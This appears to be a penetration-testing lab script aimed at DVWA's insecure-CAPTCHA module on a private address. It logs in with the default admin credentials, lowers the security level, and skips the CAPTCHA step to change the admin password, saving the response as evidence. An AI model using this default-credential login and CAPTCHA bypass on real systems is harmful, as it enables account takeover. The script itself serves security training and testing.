#!/bin/bash
B=http://10.31.0.87:3000; J=/tmp/cap_ck2.txt; rm -f $J
T=$(curl -s -c $J $B/login.php | grep -o "name='user_token' value='[a-f0-9]*'" | grep -o "[a-f0-9]\{32\}")
curl -s -b $J -c $J -d "username=admin&password=password&Login=Login&user_token=$T" $B/login.php -o /dev/null
curl -s -b $J -c $J -d "security=low&seclev_submit=Submit" $B/security.php -o /dev/null
# proper captcha flow: step1 submits the form's recaptcha
curl -s -b $J -c $J --data-urlencode "step=1" --data-urlencode "g-recaptcha-response=none" $B/vulnerabilities/captcha/ -o /tmp/cap_step1.html
CK=$(grep PHPSESSID $J | awk '{print $7}'); echo "CK=$CK"
ST=$(grep -o "name='step' value='[0-9]'" /tmp/cap_step1.html | head -1); echo "step1-> $ST"
# step2 with key trick
curl -s -b $J -c $J --data-urlencode "step=2" --data-urlencode "g-recaptcha-response=none" --data-urlencode "key=anything" --data-urlencode "password_new=Run3Bypass1!" --data-urlencode "password_conf=Run3Bypass1!" --data-urlencode "Change=Change" $B/vulnerabilities/captcha/ -o evidence/captcha/captcha-low-bypass-r3.html
grep -o "Password Changed\|CAPTCHA was incorrect" evidence/captcha/captcha-low-bypass-r3.html | sort | uniq -c; wc -c evidence/captcha/captcha-low-bypass-r3.html
